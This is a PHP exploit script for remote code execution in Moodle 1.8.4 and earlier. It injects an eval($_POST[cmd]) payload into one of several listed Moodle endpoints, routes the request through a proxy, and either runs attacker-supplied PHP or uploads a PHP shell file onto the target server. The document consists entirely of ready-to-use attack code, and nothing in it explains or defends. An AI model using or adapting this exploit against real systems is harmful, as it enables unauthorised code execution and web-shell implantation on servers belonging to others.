&lt;?php
/**
 * Moodle &lt;= 1.8.4 remote code execution
 */
$url = &#039;http://target.ru/moodle&#039;;
$proxy = &#039;localhost:8118&#039;;

$code = $argv[1];
if(!$code) {
	echo &#039;Sample use:
		&#039;.$argv[0].&#039; &quot;phpinfo()&quot; &gt; phpinfo.html
		&#039;.$argv[0].&#039; &quot;echo `set`&quot;
		&#039;.$argv[0].&#039; /full/local/path/to/file/for/upload/php_shell.php
	&#039;;
	exit;
}
$upload = false;
if(file_exists($code) &amp;&amp; is_file($code)) {
	$upload = $code;
	$code = &#039;move_uploaded_file($_FILES[file][tmp_name], basename($_FILES[file][name]))&#039;;
}
$code .= &#039;;exit;&#039;;

$injection_points = array(
	&#039;blocks/rss_client/block_rss_client_error.php&#039; =&gt; array(&#039;error&#039;),
	&#039;course/scales.php?id=1&#039; =&gt; array(&#039;name&#039;, &#039;description&#039;),
	&#039;help.php&#039; =&gt; array(&#039;text&#039;),
	&#039;login/confirm.php&#039; =&gt; array(&#039;data&#039;, &#039;s&#039;),
	&#039;mod/chat/gui_basic/index.php?id=1&#039; =&gt; array(&#039;message&#039;),
	&#039;mod/forum/post.php&#039; =&gt; array(&#039;name&#039;),
	&#039;mod/glossary/approve.php?id=1&#039; =&gt; array(&#039;hook&#039;),
	&#039;mod/wiki/admin.php&#039; =&gt; array(&#039;page&#039;),
);
$file = array_rand($injection_points);
$param = $injection_points[$file][array_rand($injection_points[$file])];
$value = &#039;&lt;img src=http&amp;{${eval($_POST[cmd])}};://target.ru&gt;&#039;;

$post_data = array($param=&gt;$value, &#039;cmd&#039;=&gt;$code);
if($upload) {
	echo &quot;Check at:\n\t\t&quot;.$url.&#039;/&#039;.dirname($file).&#039;/&#039;.basename($upload).&quot;\n&quot;;
	$post_data[&quot;file&quot;] = &#039;@&#039;.$upload;
}

$c = curl_init();
curl_setopt($c, CURLOPT_URL, $url.&#039;/&#039;.$file);
curl_setopt($c, CURLOPT_PROXY, $proxy);
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_HEADER, false);
echo curl_exec($c);
curl_close($c);
?&gt;
